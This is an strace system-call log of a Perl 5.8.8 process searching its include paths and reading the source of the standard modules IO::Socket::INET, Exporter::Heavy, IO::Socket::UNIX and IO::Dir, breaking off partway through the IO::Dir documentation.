8191  07:22:17.475774 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475788 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475802 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475816 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475830 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475842 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475856 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475868 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475882 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.475896 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
8191  07:22:17.475918 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
8191  07:22:17.475933 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0ad78) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.475944 _llseek(6, 0, [0], SEEK_CUR) = 0
8191  07:22:17.475962 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
8191  07:22:17.476344 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.476361 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.476378 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.476391 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.476405 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.476418 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.476433 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.476445 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.476459 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.476471 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.476485 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.476498 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfb0aabc) = -1 ENOENT (No such file or directory)
8191  07:22:17.476512 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfb0abac) = -1 ENOENT (No such file or directory)
8191  07:22:17.476526 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
8191  07:22:17.476548 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
8191  07:22:17.476562 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0a8c8) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.476573 _llseek(8, 0, [0], SEEK_CUR) = 0
8191  07:22:17.476591 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
8191  07:22:17.477359 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
8191  07:22:17.477566 brk(0x829c000)    = 0x829c000
8191  07:22:17.498382 read(8, "", 4096) = 0
8191  07:22:17.498533 close(8)          = 0
8191  07:22:17.499418 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
8191  07:22:17.500106 _llseek(6, 6496, [6496], SEEK_SET) = 0
8191  07:22:17.500209 _llseek(6, 0, [6496], SEEK_CUR) = 0
8191  07:22:17.500259 close(6)          = 0
8191  07:22:17.500399 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500429 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500446 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500460 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500475 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500493 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500509 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500521 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500535 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500548 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500562 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.500580 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
8191  07:22:17.500603 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
8191  07:22:17.500618 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0ad78) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.500630 _llseek(6, 0, [0], SEEK_CUR) = 0
8191  07:22:17.500647 brk(0x82bd000)    = 0x82bd000
8191  07:22:17.500664 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
8191  07:22:17.501670 _llseek(6, 1386, [1386], SEEK_SET) = 0
8191  07:22:17.501689 _llseek(6, 0, [1386], SEEK_CUR) = 0
8191  07:22:17.501699 close(6)          = 0
8191  07:22:17.501758 stat64("/etc/perl/IO/Dir.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501774 stat64("/etc/perl/IO/Dir.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501788 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501809 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501825 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501865 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501880 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501906 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501920 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501932 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfb0af6c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501945 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfb0b05c) = -1 ENOENT (No such file or directory)
8191  07:22:17.501958 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
8191  07:22:17.501984 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
8191  07:22:17.501999 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfb0ad78) = -1 ENOTTY (Inappropriate ioctl for device)
8191  07:22:17.502010 _llseek(6, 0, [0], SEEK_CUR) = 0
8191  07:22:17.502030 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { 